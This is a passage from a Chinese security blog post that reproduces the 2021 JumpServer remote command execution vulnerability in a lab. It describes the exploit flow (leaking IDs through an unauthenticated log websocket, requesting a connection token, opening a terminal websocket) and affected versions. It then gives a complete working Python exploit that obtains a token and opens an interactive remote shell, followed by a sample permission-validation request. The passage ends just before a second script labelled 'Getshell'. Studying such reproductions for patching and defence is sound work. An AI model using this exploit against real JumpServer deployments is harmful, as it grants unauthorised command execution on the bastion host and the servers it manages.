<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>JumpServer 远程命令执行-2021 - B0urne &#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="red"><meta name="application-name" content="B0urne &#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="msapplication-TileColor" content="red"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="B0urne &#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="简介JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python &amp;#x2F; Django 进行开发。"><meta property="og:type" content="blog"><meta property="og:title" content="JumpServer 远程命令执行-2021"><meta property="og:url" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/"><meta property="og:site_name" content="B0urne &#039;s Blog"><meta property="og:description" content="简介JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python &amp;#x2F; Django 进行开发。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129171923706.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125201834167.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203131152.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125202453350.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203257360.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203538811.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203606871.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203708238.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125175214316.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125215007165.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125204724544.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125205052694.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129153604280.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155636901.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155659430.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218163819021.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/d45b6183332c145770f174c3effa49f0.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/079d1e2b0daeb9145aa74a74f390fc44.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174232535.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174240992.png"><meta property="article:published_time" content="2021-01-25T09:50:55.000Z"><meta property="article:modified_time" content="2021-02-23T06:27:31.394Z"><meta property="article:author" content="B0urne"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129171923706.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/"},"headline":"B0urne 's Blog","image":["http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129171923706.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125201834167.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203131152.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125202453350.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203257360.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203538811.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203606871.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203708238.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125175214316.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125215007165.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125204724544.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125205052694.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129153604280.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155636901.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129155659430.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218163819021.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/d45b6183332c145770f174c3effa49f0.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/079d1e2b0daeb9145aa74a74f390fc44.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174232535.png","http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210218174240992.png"],"datePublished":"2021-01-25T09:50:55.000Z","dateModified":"2021-02-23T06:27:31.394Z","author":{"@type":"Person","name":"B0urne"},"description":"简介JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python &#x2F; Django 进行开发。"}</script><link rel="canonical" href="http://b0u4ne.gihub.io/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="11" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-25T09:50:55.000Z" title="2021-1-25 17:50:55">2021-01-25</time>发表</span><span class="level-item"><time dateTime="2021-02-23T06:27:31.394Z" title="2021-2-23 14:27:31">2021-02-23</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">23 分钟读完 (大约3520个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">JumpServer 远程命令执行-2021</h1><div class="content"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python / Django 进行开发。</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129171923706.png" alt="image-20210129171923706"></p>
<a id="more"></a>

<p>组件介绍：</p>
<ul>
<li>Jumpserver<ul>
<li>现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。</li>
</ul>
</li>
<li>Coco<ul>
<li>实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。</li>
</ul>
</li>
<li>Luna<ul>
<li>现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。</li>
</ul>
</li>
<li>Guacamole<ul>
<li>Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用</li>
</ul>
</li>
</ul>
<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器，执行任意命令。建议相关用户尽快采取措施阻止漏洞攻击。</p>
<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>1.通过ws连接jumpserver的未授权api，进行日志读取 获取三个id值 (system_id,target_id,system_user_id)</p>
<p>2.利用 /api/v1/authentication/connection-token/?user-only=1  获取token （此token 20s内有效）</p>
<p>3.通过ws 连接 /koko/ws/token/?target_id  带入刚刚获取的token_id 进行执行命令</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JumpServer &lt; v2.6.2<br>JumpServer &lt; v2.5.4<br>JumpServer &lt; v2.4.5<br>JumpServer = v1.5.9</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装JumpServer-v2-6-1"><a href="#安装JumpServer-v2-6-1" class="headerlink" title="安装JumpServer v2.6.1"></a>安装JumpServer v2.6.1</h2><p>安装脚本<a target="_blank" rel="noopener" href="https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip">https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip</a></p>
<p>要求Centos 7 系统，内存8G以上，cpu 2核以上</p>
<p>或者执行官网脚本</p>
<p>curl -sSL <a target="_blank" rel="noopener" href="https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh">https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh</a> | bash</p>
<p>解压缩后执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;quick_start.sh </span><br></pre></td></tr></table></figure>
<p>默认即可(不引用外部redis,mysql)</p>
<p>进入/opt/jumpserver-installer-v2.6.2，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh start</span><br></pre></td></tr></table></figure>
<p>如下图为执行正常</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125201834167.png" alt="image-20210125201834167"></p>
<p>降级到v2.6.1，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh upgrade v2.6.1</span><br></pre></td></tr></table></figure>
<p>其他命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh stop</span><br><span class="line">.&#x2F;jmsctl.sh restart</span><br><span class="line">.&#x2F;jmsctl.sh backup</span><br><span class="line">.&#x2F;jmsctl.sh upgrade</span><br></pre></td></tr></table></figure>
<p>web后台</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">https:&#x2F;&#x2F;127.0.0.1:8443</span><br></pre></td></tr></table></figure>
<p>ssh/sftp访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh admin@127.0.0.1 -p2222</span><br><span class="line">sftp -P2222 admin@127.0.0.1</span><br></pre></td></tr></table></figure>
<p>相关资料：</p>
<p><a target="_blank" rel="noopener" href="https://docs.jumpserver.org/">https://docs.jumpserver.org</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jumpserver.org/">https://www.jumpserver.org</a></p>
<h2 id="访问web端"><a href="#访问web端" class="headerlink" title="访问web端"></a>访问web端</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
<p>admin/admin</p>
<p>先随便创建一台同网段的Linux虚拟机192.168.132.131，然后添加到资产列表中，通过web端访问后才能获取三个id值</p>
<p>创建系统用户</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203131152.png" alt="image-20210125203131152"></p>
<p>更新管理用户</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125202453350.png" alt="image-20210125202453350"></p>
<p>资产列表添加主机</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203257360.png" alt="image-20210125203257360"></p>
<p>资产授权</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203538811.png" alt="image-20210125203538811"></p>
<p>打开web终端</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203606871.png" alt="image-20210125203606871"></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203708238.png" alt="image-20210125203708238"></p>
<h1 id="脚本复现"><a href="#脚本复现" class="headerlink" title="脚本复现"></a>脚本复现</h1><h2 id="脚本1"><a href="#脚本1" class="headerlink" title="脚本1"></a>脚本1</h2><p>1、运行脚本获取到asset、system_user、user三个ID值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aioconsole</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># def get_celery_task_log_path(task_id):</span></span><br><span class="line"><span class="comment">#     task_id = str(task_id)</span></span><br><span class="line"><span class="comment">#     rel_path = os.path.join(task_id[0], task_id[1], task_id + &quot;.log&quot;)</span></span><br><span class="line"><span class="comment">#     path = os.path.join(&quot;/opt/jumpserver/&quot;, rel_path)</span></span><br><span class="line"><span class="comment">#     return path</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket, _text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_loop</span>(<span class="params">ws, session_id</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmdline = <span class="keyword">await</span> aioconsole.ainput()</span><br><span class="line">        <span class="keyword">await</span> send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;<span class="string">&quot;id&quot;</span>: session_id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmdline + <span class="string">&quot;\n&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">recv_loop</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_text = <span class="keyword">await</span> ws.recv()</span><br><span class="line">        ret = json.loads(recv_text)</span><br><span class="line">        <span class="keyword">if</span> ret.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;TERMINAL_DATA&quot;</span>):</span><br><span class="line">            <span class="keyword">await</span> aioconsole.aprint(ret[<span class="string">&quot;data&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>():</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> client:</span><br><span class="line">        recv_text = <span class="keyword">await</span> client.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        session_id = json.loads(recv_text)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span> + session_id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: session_id,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> send_msg(client, inittext)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://192.168.132.130:8080&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    <span class="keyword">if</span> host[-<span class="number">1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        host = host[:-<span class="number">1</span>]</span><br><span class="line">    print(host)</span><br><span class="line">    data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;61ec790f-b47b-4cb5-b598-548a559ba44e&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;90e76a94-e014-495a-80e4-81c2e01de480&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;8bdae30c-dada-4676-90fe-797941d569cd&quot;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    res = requests.post(host + url, json=data)</span><br><span class="line">    token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    print(<span class="string">&quot;token:%s&quot;</span> % (token,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    target = (</span><br><span class="line">        <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125175214316.png" alt="image-20210125175214316"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;api&#x2F;v1&#x2F;perms&#x2F;asset-permissions&#x2F;user&#x2F;validate&#x2F;?action_name&#x3D;connect&amp;asset_id&#x3D;90e76a94-e014-495a-80e4-81c2e01de480&amp;cache_policy&#x3D;1&amp;system_user_id&#x3D;8bdae30c-dada-4676-90fe-797941d569cd&amp;user_id&#x3D;61ec790f-b47b-4cb5-b598-548a559ba44e</span><br></pre></td></tr></table></figure>
<p>2、将asset，system_user，user三个ID值放入下面脚本，Getshell</p>
